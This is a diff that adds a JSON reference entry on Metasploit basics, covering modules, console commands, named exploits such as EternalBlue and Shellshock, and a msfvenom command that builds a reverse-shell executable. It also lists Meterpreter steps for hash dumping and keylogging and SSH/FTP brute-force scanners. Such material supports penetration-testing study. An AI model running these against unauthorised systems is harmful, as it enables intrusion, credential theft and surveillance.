@@ -1,0 +1,24 @@
+{
+    "metasploit_basics": {
+        "title": "Metasploit Framework Basics",
+        "description": "Core concepts and commands for the Metasploit Framework, the most widely used penetration testing toolkit.",
+        "keywords": [
+            "metasploit",
+            "msf",
+            "msfconsole",
+            "exploit",
+            "payload",
+            "meterpreter",
+            "post exploitation"
+        ],
+        "topics": {
+            "Architecture": "Metasploit has a modular architecture: Exploits (code that triggers a vulnerability), Payloads (code that runs after successful exploitation — singles, stagers, stages), Encoders (obfuscate payloads), Nops (NOP sled generators), Auxiliary (scanners, fuzzers, DoS), Post (post-exploitation modules). Data is stored in PostgreSQL.",
+            "Basic Commands": "msfconsole — start the framework. db_status — check database connection. workspace — manage workspaces. search <term> — find modules. use <module> — select a module. info — module details. show options — required options. set RHOSTS <target> — set target. set PAYLOAD <payload> — select payload. exploit / run — launch. sessions -l — list sessions. sessions -i <id> — interact with session.",
+            "Common Exploits": "exploit/multi/handler — catch reverse shells. exploit/windows/smb/ms17_010_eternalblue — EternalBlue. exploit/windows/smb/psexec — authenticated code exec. exploit/unix/ftp/vsftpd_234_backdoor — vsftpd backdoor. exploit/multi/http/apache_mod_cgi_bash_env_exec — Shellshock.",
+            "Payloads": "windows/meterpreter/reverse_tcp — Windows Meterpreter reverse shell. linux/x86/meterpreter/reverse_tcp — Linux Meterpreter. windows/shell_reverse_tcp — simple Windows reverse shell. cmd/unix/reverse_bash — Bash reverse shell. msfvenom — standalone payload generator: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe",
+            "Meterpreter Commands": "sysinfo — system info. getuid — current user. getsystem — attempt privilege escalation. hashdump — dump password hashes. ps — process list. migrate <PID> — migrate to process. upload/download — file transfer. shell — drop to OS shell. portfwd — port forwarding. keyscan_start/keyscan_dump — keylogging. screenshot — take screenshot. run post/multi/recon/local_exploit_suggester — find local privilege escalation vectors.",
+            "Auxiliary Modules": "auxiliary/scanner/portscan/tcp — TCP port scan. auxiliary/scanner/smb/smb_version — SMB version detection. auxiliary/scanner/http/http_version — web server info. auxiliary/scanner/ssh/ssh_login — SSH brute force. auxiliary/scanner/ftp/ftp_login — FTP brute force. auxiliary/scanner/discovery/udp_sweep — UDP service discovery.",
+            "Database & Reporting": "db_nmap — run nmap and import results. hosts — list discovered hosts. services — list discovered services. vulns — list discovered vulns. creds — stored credentials. loot — collected loot files. db_export — export data. Example workflow: workspace -a pentest1 → db_nmap -sV target → hosts → services → vulns → search relevant exploit → use → exploit."
+        }
+    }
+}
